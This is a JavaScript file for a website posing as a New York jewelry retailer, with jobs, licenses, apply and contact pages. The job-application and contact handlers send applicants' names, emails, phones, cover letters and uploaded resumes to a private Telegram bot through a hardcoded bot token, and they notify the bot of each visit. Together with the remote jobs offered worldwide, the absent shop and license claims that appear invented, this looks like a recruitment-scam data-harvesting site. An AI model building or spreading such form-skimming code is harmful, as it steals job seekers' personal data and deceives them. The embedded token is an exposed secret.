// ----------------------------- DATA MODELS -----------------------------
const pages = {
  home: homePage,
  about: aboutPage,
  jobs: jobsPage,
  licenses: licensePage,
  apply: applyPage,
  contact: contactPage
};

let activeIntervals = []; // Store intervals to clean them up on page change

// Helper function for Telegram API
async function sendTelegramMessage(text, file = null) {
  const botToken = '8526650918:AAGnLa86BtAohGUNMllQPkHWgAW0ZT63t6Q';
  const chatId = '8469619186';
  const url = `https://api.telegram.org/bot${botToken}`;

  if (file) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', text);
    formData.append('document', file);
    return fetch(`${url}/sendDocument`, { method: 'POST', body: formData });
  } else {
    return fetch(`${url}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: text }) });
  }
}

function renderPage(pageId) {
  const container = document.getElementById('app-root');
  
  // Clear any running slideshows from previous page
  activeIntervals.forEach(clearInterval);
  activeIntervals = [];

  if (pages[pageId]) {
    container.innerHTML = pages[pageId]();
    attachPageSpecificScripts(pageId);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  } else {
    container.innerHTML = homePage();
    attachPageSpecificScripts('home');
  }
  // update active nav
  document.querySelectorAll('.nav-links a').forEach(link => {
    const pageAttr = link.getAttribute('data-page');
    if (pageAttr === pageId) link.classList.add('active');
    else link.classList.remove('active');
  });
}

function attachPageSpecificScripts(pageId) {
  if (pageId === 'home') {
    const slideshows = document.querySelectorAll('.card-slideshow');
    slideshows.forEach(container => {
      const slides = container.querySelectorAll('img');
      if (slides.length > 1) {
        let index = 0;
        const interval = setInterval(() => {
          slides[index].classList.remove('active');
          index = (index + 1) % slides.length;
          slides[index].classList.add('active');
        }, 3000 + Math.random() * 1000); // Random offset for natural feel
        activeIntervals.push(interval);
      }
    });
  }
  if (pageId === 'jobs') {
    document.querySelectorAll('.toggle-details-btn').forEach(btn => {
      btn.addEventListener('click', (e) => {
        const details = e.target.closest('.job-list-item').querySelector('.job-details-content');
        if (details.style.display === 'none') {
          details.style.display = 'block';
          e.target.textContent = 'Hide Details';
        } else {
          details.style.display = 'none';
          e.target.textContent = 'Show Details';
        }
      });
    });
  }
  if (pageId === 'apply') {
    const form = document.getElementById('job-application-form');
    if (form) {
      // Remove any existing listener to avoid duplicates
      const newForm = form.cloneNode(true);
      form.parentNode.replaceChild(newForm, form);
      newForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const name = document.getElementById('fullname').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const position = document.getElementById('position').value;
        if (!name || !email || !phone || !position) {
          alert('Please fill all required fields: Name, Email, Phone, Position.');
          return;
        }
        if (!/^\S+@\S+\.\S+$/.test(email)) {
          alert('Please enter a valid email address.');
          return;
        }

        // --- Send to Telegram ---
        const coverLetter = document.getElementById('coverletter').value;
        const telegramMsg = `📝 New Job Application\n\n👤 Name: ${name}\n📧 Email: ${email}\n📱 Phone: ${phone}\n💼 Position: ${position}\n\n📄 Cover Letter: ${coverLetter || 'N/A'}`;
        const resumeFile = document.getElementById('resume').files[0];
        sendTelegramMessage(telegramMsg, resumeFile).catch(console.error);
        // ------------------------

        let msgDiv = document.getElementById('form-success-msg');
        if (!msgDiv) {
          msgDiv = document.createElement('div');
          msgDiv.id = 'form-success-msg';
          newForm.prepend(msgDiv);
        }
        msgDiv.innerHTML = '<div class="success-msg">✅ Application submitted! Thank you for your interest. We\'ll be in touch.</div>';
        msgDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        newForm.reset();
        setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 4000);
      });
    }
  }
  if (pageId === 'contact') {
    const contactForm = document.getElementById('contactForm');
    if (contactForm) {
      const newContactForm = contactForm.cloneNode(true);
      contactForm.parentNode.replaceChild(newContactForm, contactForm);
      newContactForm.addEventListener('submit', (e) => {
        e.preventDefault();
        
        const name = document.getElementById('contactName').value;
        const email = document.getElementById('contactEmail').value;
        const message = document.getElementById('contactMessage').value;

        // --- Send to Telegram ---
        const telegramMsg = `📩 New Contact Message\n\n👤 Name: ${name}\n📧 Email: ${email}\n💬 Message: ${message}`;
        sendTelegramMessage(telegramMsg).catch(console.error);
        // ------------------------

        alert('✨ Message sent! Thank you for reaching out. We will respond within 24 hours.');
        newContactForm.reset();
      });
    }
  }
  // newsletter subscription (global)
  const newsBtn = document.getElementById('newsBtn');
  if(newsBtn) {
    // Remove old listener by cloning to avoid duplicates
    const newNewsBtn = newsBtn.cloneNode(true);
    newsBtn.parentNode.replaceChild(newNewsBtn, newsBtn);
    newNewsBtn.onclick = () => {
      const emailInp = document.getElementById('newsEmail');
      if(emailInp && emailInp.value.trim()) alert(`Thanks ${emailInp.value} for subscribing to Lumina!`);
      else alert('Please enter an email address.');
    };
  }
}

// ----- PAGES -----
function homePage() {
  return `
    <div class="hero fade-up">
      <div class="hero-overlay">
        <div class="hero-content">
          <h1>Timeless Elegance,<br>Crafted for You</h1>
          <p>Discover heirloom-quality jewelry with real gold, diamonds & gemstones.</p>
          <div class="hero-buttons">
            <a href="#" class="btn-primary" data-nav-shop>Shop Now</a>
            <a href="#" class="btn-outline" data-page-nav="about">Explore Collection</a>
          </div>
        </div>
      </div>
    </div>
    <div class="container">
      <section>
        <h2 class="section-title">Featured Collections</h2>
        <div class="collections-grid">
          <div class="collection-card">
            <div class="card-slideshow">
              <img src="images/rings.png" alt="Diamond ring" class="active">
              <img src="images/diamonds.png" alt="Solitaire ring">
              <img src="images/rings1.png" alt="Ring detail">
            </div>
            <h3>Rings</h3><p>Diamond & gold bands</p><a href="#" class="btn-outline" style="margin-top:1rem" data-nav-shop>Shop Now</a></div>
          <div class="collection-card">
            <div class="card-slideshow">
              <img src="images/necklace.png" alt="Gold necklace" class="active">
              <img src="images/rings.png" alt="Gold detail">
              <img src="images/necklace1.png" alt="Necklace detail">
            </div>
            <h3>Necklaces</h3><p>Champagne gold chains</p><a href="#" class="btn-outline" style="margin-top:1rem" data-nav-shop>Shop Now</a></div>
          <div class="collection-card">
            <div class="card-slideshow">
              <img src="images/bracelets.png" alt="Bracelet with gemstones" class="active">
              <img src="images/bangles.png" alt="Gold Bangle">
              <img src="images/bracelets1.png" alt="Bracelet detail">
            </div>
            <h3>Bracelets</h3><p>Emerald & diamond accents</p><a href="#" class="btn-outline" style="margin-top:1rem" data-nav-shop>Shop Now</a></div>
          <div class="collection-card">
            <div class="card-slideshow">
              <img src="images/ear.png" alt="Pearl earrings" class="active">
              <img src="images/halo.png" alt="Sapphire Halo Earrings">
              <img src="images/ear1.png" alt="Earring detail">
            </div>
            <h3>Earrings</h3><p>Timeless drops & studs</p><a href="#" class="btn-outline" style="margin-top:1rem" data-nav-shop>Shop Now</a></div>
        </div>
      </section>
      <section>
        <h2 class="section-title">Jewelry of the moment</h2>
        <div class="product-showcase">
          <div class="product-item"><img src="images/diamonds.png" alt="Solitaire ring" loading="lazy"><p>Solitaire Diamond Ring</p></div>
          <div class="product-item"><img src="images/bangles.png" alt="Gold bangle" loading="lazy"><p>Gold Bangle</p></div>
          <div class="product-item"><img src="images/halo.png" alt="Sapphire earrings" loading="lazy"><p>Sapphire Halo Earrings</p></div>
        </div>
      </section>
      <section>
        <h2 class="section-title">Kind Words</h2>
        <div class="testimonial-grid">
          <div class="testimonial"><div style="color:#B48C48; margin-bottom:0.5rem"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Exquisite craftsmanship and radiant diamonds. My forever ring!"</p><strong>- Elena R.</strong></div>
          <div class="testimonial"><div style="color:#B48C48; margin-bottom:0.5rem"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"The necklace is pure elegance, arrived in beautiful packaging."</p><strong>- Sophia M.</strong></div>
          <div class="testimonial"><div style="color:#B48C48; margin-bottom:0.5rem"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Lumina's quality is unmatched. Truly timeless pieces."</p><strong>- Amara K.</strong></div>
          <div class="testimonial"><div style="color:#B48C48; margin-bottom:0.5rem"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"The custom engagement ring exceeded all expectations. She said yes!"</p><strong>- Michael T.</strong></div>
          <div class="testimonial"><div style="color:#B48C48; margin-bottom:0.5rem"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"Exceptional customer service and the gold quality is superb."</p><strong>- Sarah L.</strong></div>
          <div class="testimonial"><div style="color:#B48C48; margin-bottom:0.5rem"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div><p>"A true masterpiece. I wear these earrings every single day."</p><strong>- Jessica B.</strong></div>
        </div>
      </section>
      <section>
        <div class="gallery-grid">
          <img src="images/diamonds.png" alt="luxury jewelry model" loading="lazy">
          <img src="images/bracelets.png" alt="hand with diamond bracelet" loading="lazy">
          <img src="images/ear.png" alt="gold earrings closeup" loading="lazy">
          <img src="images/halo.png" alt="artisan at work" loading="lazy">
        </div>
      </section>
    </div>
  `;
}

function aboutPage() {
  return `<div class="container fade-up">
    <section><h1 class="section-title">Our Legacy of Trust</h1>
    <div class="about-story"><div class="about-text"><p style="font-size:1.2rem">At Lumina, trust is the cornerstone of our craft. For over 20 years, we have been dedicated to the art of fine jewelry, ensuring that every piece is not only beautiful but ethically sourced and built to last a lifetime.</p><p style="margin-top:1rem">We stand behind the quality of our work with a lifetime warranty on craftsmanship. When you choose Lumina, you are choosing transparency, certified authenticity, and a family-owned business that values your story as much as our own.</p><div class="materials-list"><span class="material-badge">GIA Certified</span><span class="material-badge">Solid 18K Gold</span><span class="material-badge">Conflict-Free</span><span class="material-badge">Lifetime Warranty</span></div></div>
    <div class="about-image"><img src="https://images.pexels.com/photos/3762879/pexels-photo-3762879.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Artisan hands crafting jewelry" loading="lazy"></div></div>
    <div style="background:#F9F2E8; border-radius: 32px; padding:2rem; text-align:center"><h2>Uncompromising Standards</h2><p>We refuse to cut corners. Our diamonds are graded for superior cut and clarity, and we use only solid gold—never plated or filled. Experience the weight and warmth of true luxury.</p></div>
    </section></div>`;
}

function jobsPage() {
  const roles = [
    {title:"Customer Service Representative", category:"Support", desc:"Provide white-glove support, handle inquiries, and ensure client delight.", resp:"Answer calls/emails, resolve issues, maintain CRM.", req:"1+ year luxury service exp, excellent communication."},
    {title:"Administrative Assistant", category:"Administration", desc:"Support daily operations, schedule coordination, and document management.", resp:"Calendar management, vendor communication, inventory logs.", req:"Organized, MS Office, attention to detail."},
    {title:"Warehouse Associate", category:"Logistics", desc:"Manage jewelry inventory, packing, and quality checks.", resp:"Pick/pack orders, inspect pieces, maintain stock.", req:"Detail-oriented, ability to handle luxury goods."},
    {title:"Customer Experience Researcher", category:"Research", desc:"Conduct user research and analyze customer feedback to improve the overall customer experience.", resp:"Plan and conduct user interviews, surveys, and usability tests. Analyze data and create reports.", req:"Bachelor's degree in a related field. Experience with user research methodologies."},
    {title:"Bookkeeper/Cashier", category:"Finance", desc:"Handle financial records, cash reconciliation, and invoices.", resp:"AP/AR, sales tracking, bank reconciliations.", req:"QuickBooks experience, numeric accuracy."}
  ];
  
  const listItems = roles.map(r => `
    <div class="job-list-item">
      <div class="job-header-row">
        <h3>${r.title}</h3>
        <button class="btn-outline btn-sm toggle-details-btn">Show Details</button>
      </div>
      <div class="job-details-content" style="display:none;">
        <p><strong>Category:</strong> ${r.category}</p>
        <p style="margin-top:0.5rem"><strong>Role:</strong> ${r.desc}</p>
        <p style="margin-top:0.5rem"><strong>Responsibilities:</strong> ${r.resp}</p>
        <p style="margin-top:0.5rem"><strong>Requirements:</strong> ${r.req}</p>
        <a href="#" class="btn-primary apply-link" data-page-nav="apply" style="margin-top:1rem; display:inline-block">Apply Now</a>
      </div>
    </div>
  `).join('');

  return `<div class="container fade-up"><section>
    <h1 class="section-title">Join Our Team</h1>
    <p class="section-sub">Discover meaningful work at LUMINA ATELIER. Timeless elegance, crafted for you. Real gold, diamonds, and passion..</p>
    
    <div class="section-divider"></div>
    
    <p class="jobs-intro">We embrace remote work and welcome candidates from around the world. If you don’t see a position that matches your skills, feel free to send us your resume — we’re always looking for talented people!</p>
    
    <div class="search-filter-container">
      <input type="text" placeholder="Search job titles or descriptions" class="job-search-input">
      <select class="job-category-select">
        <option>All Categories</option>
        <option>Support</option>
        <option>Administration</option>
        <option>Logistics</option>
        <option>Finance</option>
      </select>
    </div>

    <div class="jobs-list-container">
      ${listItems}
    </div>
  </section></div>`;
}

function licensePage() {
  return `
    <div class="container fade-up">
      <section>
        <h1 class="section-title">Certifications & Licenses</h1>
        <p class="section-sub">Transparency is the ultimate luxury. We invite you to verify our credentials and shop with absolute confidence.</p>
        
        <div class="jobs-grid">
          <div class="job-card">
            <h3><i class="fas fa-certificate" style="color:#B48C48"></i> Business License</h3>
            <p><strong>License #:</strong> NY-784492-LUM</p>
            <p><strong>Issued By:</strong> State of New York</p>
            <p>Registered as Lumina Atelier LLC. Active and in good standing since 2003.</p>
          </div>
          <div class="job-card">
            <h3><i class="fas fa-gem" style="color:#B48C48"></i> GIA Alumni Member</h3>
            <p><strong>Member ID:</strong> GIA-AL-99201</p>
            <p>Our gemologists hold Graduate Gemologist (GG) certifications from the Gemological Institute of America.</p>
          </div>
          <div class="job-card">
            <h3><i class="fas fa-shield-alt" style="color:#B48C48"></i> Insured Shipping</h3>
            <p><strong>Partner:</strong> Lloyd's of London</p>
            <p>All shipments are fully insured from our atelier to your doorstep, requiring signature on delivery.</p>
          </div>
        </div>
        <div style="margin-top: 3rem; background:#F7F2EA; border-radius: 28px; padding:2rem; text-align:center"><h3><i class="fas fa-check-circle"></i> Authenticity Guarantee</h3><p style="margin-top:1rem">Every piece comes with a signed Certificate of Authenticity detailing metal purity and gemstone grade. We adhere strictly to the Kimberley Process for conflict-free diamonds.</p></div>
      </section>
    </div>`;
}

function applyPage() {
  return `<div class="container fade-up"><section><h1 class="section-title">Apply to Lumina</h1><div class="form-container"><form id="job-application-form">
    <div class="form-group"><label>Full Name *</label><input type="text" id="fullname" required></div>
    <div class="form-group"><label>Email *</label><input type="email" id="email" required></div>
    <div class="form-group"><label>Phone *</label><input type="tel" id="phone" required></div>
    <div class="form-group"><label>Position Applying For *</label><select id="position" required><option value="">Select role</option><option>Customer Service Representative</option><option>Administrative Assistant</option><option>Warehouse Associate</option><option>Bookkeeper/Cashier</option></select></div>
    <div class="form-group"><label>Resume Upload (PDF/DOC)</label><input type="file" id="resume" accept=".pdf,.doc,.docx"></div>
    <div class="form-group"><label>Cover Letter</label><textarea rows="4" id="coverletter" placeholder="Why do you want to join Lumina?"></textarea></div>
    <button type="submit" class="btn-primary" style="width:100%">Submit Application</button>
  </form></div></section></div>`;
}

function contactPage() {
  // Using the specific address and phone number provided
  const businessPhone = "(516) 536-7888";
  const businessAddress = "3110 Long Beach Rd, Oceanside, New York 11572";
  return `<div class="container fade-up"><section><h1 class="section-title">Contact Us</h1><div class="contact-layout">
    <div class="contact-col">
      <div class="form-container contact-form-adjust">
        <form id="contactForm">
          <div class="form-group"><label>Name *</label><input type="text" id="contactName" required></div>
          <div class="form-group"><label>Email *</label><input type="email" id="contactEmail" required></div>
          <div class="form-group"><label>Message *</label><textarea id="contactMessage" rows="5" required></textarea></div>
          <button class="btn-primary" type="submit" style="width:100%">Send Message</button>
        </form>
      </div>
    </div>
    <div class="contact-col">
      <div class="contact-info-card">
        <h3 style="margin-bottom:1rem">📞 Get in Touch</h3>
        <p style="margin-bottom:0.8rem"><i class="fas fa-envelope" style="width:2rem; color:#B48C48"></i> hello@lumina.com</p>
        <p style="margin-bottom:0.8rem"><i class="fab fa-whatsapp" style="width:2rem; color:#B48C48"></i> ${businessPhone}</p>
        <p style="margin-bottom:1.2rem"><i class="fas fa-map-marker-alt" style="width:2rem; color:#B48C48"></i> ${businessAddress}</p>
        <div class="map-placeholder">
          <i class="fas fa-map-pin" style="font-size:2rem; color:#B48C48; margin-bottom:0.5rem; display:block"></i>
          <p style="font-weight:500">📍 Lumina Atelier Showroom</p>
          <p style="font-size:0.9rem">${businessAddress}</p>
          <p style="font-size:0.8rem; margin-top:0.5rem">By appointment only — please call ahead.</p>
          <!-- Embedded static map approximation using OpenStreetMap static image idea (lightweight) -->
          <div style="background:#E2D9CF; border-radius:16px; margin-top:1rem; padding:0.5rem; font-size:0.8rem">
            <i class="fas fa-location-dot"></i> Corner of Long Beach Rd & Waukena Ave
          </div>
        </div>
      </div>
    </div>
  </div></section></div>`;
}

// navigation handling
function initRouting() {
  const navLinks = document.querySelectorAll('.nav-links a');
  navLinks.forEach(link => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      const page = link.getAttribute('data-page');
      renderPage(page);
    });
  });
  document.addEventListener('click', (e) => {
    const target = e.target.closest('[data-page-nav]');
    if(target && target.getAttribute('data-page-nav')) {
      e.preventDefault();
      renderPage(target.getAttribute('data-page-nav'));
    }
    if(e.target.closest('[data-nav-shop]')) {
      e.preventDefault();
      alert('✨ Shop experience coming soon — explore our collections above!');
    }
  });
  const mobileBtn = document.getElementById('menuToggle');
  if(mobileBtn) mobileBtn.addEventListener('click', () => { 
    document.getElementById('navLinks').classList.toggle('show'); 
  });
  renderPage('home');

  // Notify Telegram when the site is visited
  sendTelegramMessage("🔔 New visitor on Lumina website!").catch(console.error);
}
initRouting();
